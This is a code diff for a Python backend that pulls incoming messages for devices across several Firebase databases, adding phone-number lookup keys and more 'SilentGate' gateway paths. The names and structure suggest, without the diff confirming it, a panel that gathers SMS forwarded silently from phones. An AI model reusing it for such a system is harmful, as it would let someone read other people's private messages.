@@ -137,10 +137,13 @@ def _find_client_node(client_id: str) -> Optional[Dict[str, str]]:
         return CLIENT_NODE_MAP[client_id]
 
     def probe(node):
+        # Probe /clients/, /gateways/, AND /messages/ paths (SilentGate + Legacy)
         res = _firebase_request_node(node, 'GET', f'/clients/{client_id}')
         if res:
             return node
-        # Also check /messages/{client_id}
+        res_gw = _firebase_request_node(node, 'GET', f'/gateways/{client_id}')
+        if res_gw:
+            return node
         res_msgs = _firebase_request_node(node, 'GET', f'/messages/{client_id}', params="&shallow=true")
         if res_msgs:
             return node
@@ -393,12 +396,22 @@ def get_incoming_messages(client_id: str, limit: int = 150) -> List[Dict[str, An
     """
     Get last 'limit' incoming messages for a device/client across all configured Firebase RTDB nodes.
     Applies multi-identifier key resolution (deviceId, firebaseNodeId, phoneNumber) and deep datetime parsing.
+    Uses limitToLast only (no orderBy=$key which requires Firebase index rules).
     """
     if not client_id:
         return []
 
     # 1. Resolve candidate RTDB keys for this client_id
     candidate_keys = [client_id]
+    
+    # Add phone number variants as candidate keys from phone cache
+    if client_id in GLOBAL_PHONE_CACHE:
+        cached_phone = GLOBAL_PHONE_CACHE[client_id].get("mobNo", "")
+        if cached_phone and cached_phone not in candidate_keys:
+            candidate_keys.append(cached_phone)
+            clean_digits = cached_phone.replace("+", "")
+            if clean_digits and clean_digits not in candidate_keys:
+                candidate_keys.append(clean_digits)
     
     # Check if client_id maps to any known SIM node in memory
     try:
@@ -408,48 +421,55 @@ def get_incoming_messages(client_id: str, limit: int = 150) -> List[Dict[str, An
                 for k in (sn.firebase_node_id, sn.device_id, sn.phone_number):
                     if k and k not in candidate_keys:
                         candidate_keys.append(k)
+                # Also add clean digits variant
+                clean = getattr(sn, 'clean_digits', '')
+                if clean and clean not in candidate_keys:
+                    candidate_keys.append(clean)
     except Exception as e:
         logger.debug(f"[get_incoming_messages] Candidate key mapping notice: {e}")
 
     result = None
 
-    # 2. Try mapped keys first against owning node in CLIENT_NODE_MAP or direct node lookup
+    # 2. Try mapped keys first against owning node — NO orderBy=$key (fails without Firebase index rules)
     for key in candidate_keys:
         node = _find_client_node(key)
         if node:
-            params = f"&orderBy=%22%24key%22&limitToLast={limit}"
-            # Check /messages/{key}
+            params = f"&limitToLast={limit}"
+            # Check /messages/{key} (SilentGate primary path)
             res = _firebase_request_node(node, 'GET', f'/messages/{key}', params=params)
             if res and isinstance(res, dict):
                 result = res
                 break
-            # Check /clients/{key}/messages
+            # Check /clients/{key}/messages (Legacy path)
             res_c = _firebase_request_node(node, 'GET', f'/clients/{key}/messages', params=params)
             if res_c and isinstance(res_c, dict):
                 result = res_c
                 break
-            # Check /gateways/{key}/messages
+            # Check /gateways/{key}/messages (SilentGate alternate path)
             res_g = _firebase_request_node(node, 'GET', f'/gateways/{key}/messages', params=params)
             if res_g and isinstance(res_g, dict):
                 result = res_g
                 break
-            # Check root /gateways/{key} or /clients/{key} for 'messages' attribute
+            # Check root /gateways/{key} for embedded 'messages' attribute
             res_root = _firebase_request_node(node, 'GET', f'/gateways/{key}')
             if res_root and isinstance(res_root, dict) and isinstance(res_root.get("messages"), dict):
                 result = res_root["messages"]
                 break
 
-    # 3. If still empty, probe all configured Firebase nodes concurrently across candidate keys
+    # 3. If still empty, probe ALL Firebase nodes concurrently across ALL candidate keys
     if not result or not isinstance(result, dict):
         def probe_messages(n):
             for k in candidate_keys:
                 params = f"&limitToLast={limit}"
+                # Primary: /messages/{key}
                 res = _firebase_request_node(n, 'GET', f'/messages/{k}', params=params)
                 if res and isinstance(res, dict):
                     return n, k, res
+                # Fallback 1: /clients/{key}/messages
                 res_c = _firebase_request_node(n, 'GET', f'/clients/{k}/messages', params=params)
                 if res_c and isinstance(res_c, dict):
                     return n, k, res_c
+                # Fallback 2: /gateways/{key}/messages
                 res_g = _firebase_request_node(n, 'GET', f'/gateways/{k}/messages', params=params)
                 if res_g and isinstance(res_g, dict):
                     return n, k, res_g
